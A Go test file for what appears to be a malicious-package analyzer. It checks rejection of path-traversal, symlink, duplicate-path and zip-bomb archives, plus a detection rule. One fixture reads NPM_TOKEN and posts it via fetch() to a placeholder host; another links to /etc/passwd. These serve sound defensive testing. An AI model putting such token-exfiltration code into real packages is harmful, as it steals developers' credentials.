package analysis

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"os"
	"strings"
	"testing"
	"zoli.dev/intel-feed/internal/config"
)

func TestArchiveTraversalLinksDuplicatesAndBombs(t *testing.T) {
	limits := config.Default().Analysis
	for _, h := range []tar.Header{{Name: "../escape", Size: 1, Mode: 0644}, {Name: "link", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd"}, {Name: "hardlink", Typeflag: tar.TypeLink, Linkname: "target"}} {
		var b bytes.Buffer
		w := tar.NewWriter(&b)
		w.WriteHeader(&h)
		if h.Size > 0 {
			w.Write([]byte("x"))
		}
		w.Close()
		if _, err := Inspect(b.Bytes(), limits); err == nil {
			t.Fatalf("accepted %+v", h)
		}
	}
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for i := 0; i < 2; i++ {
		f, _ := zw.Create("same.py")
		f.Write([]byte("hello"))
	}
	zw.Close()
	if _, err := Inspect(b.Bytes(), limits); err == nil {
		t.Fatal("accepted duplicate paths")
	}
	b.Reset()
	zw = zip.NewWriter(&b)
	f, _ := zw.Create("bomb.py")
	f.Write([]byte(strings.Repeat("a", 1024)))
	zw.Close()
	limits.MaxExpandedBytes = 512
	if _, err := Inspect(b.Bytes(), limits); err == nil {
		t.Fatal("accepted expansion bomb")
	}
}
func TestRulesRequirePatternConjunction(t *testing.T) {
	rules, err := LoadRules("../../rules/rules.yaml")
	if err != nil {
		t.Fatal(err)
	}
	files := []File{{Name: "index.js", Data: []byte(`const token = process.env.NPM_TOKEN;`)}}
	if ev := Scan(files, "npm", "digest", rules); len(ev) != 0 {
		t.Fatal("credential access alone flagged")
	}
	files[0].Data = append(files[0].Data, []byte(`fetch("https://example.invalid/", {body:token});`)...)
	if ev := Scan(files, "npm", "digest", rules); len(ev) != 1 || ev[0].RuleID != "ZOLI-STATIC-001" {
		t.Fatal(ev)
	}
}
func TestArchiveRegularFiles(t *testing.T) {
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	h := &zip.FileHeader{Name: "package/index.js"}
	h.SetMode(os.FileMode(0644))
	f, _ := zw.CreateHeader(h)
	f.Write([]byte("console.log('hello')"))
	zw.Close()
	files, err := Inspect(b.Bytes(), config.Default().Analysis)
	if err != nil || len(files) != 1 {
		t.Fatal(files, err)
	}
}
func TestPinnedSandboxImages(t *testing.T) {
	if pinnedImage("node:latest") || !pinnedImage("sha256:"+strings.Repeat("a", 64)) {
		t.Fatal("image pin policy")
	}
}
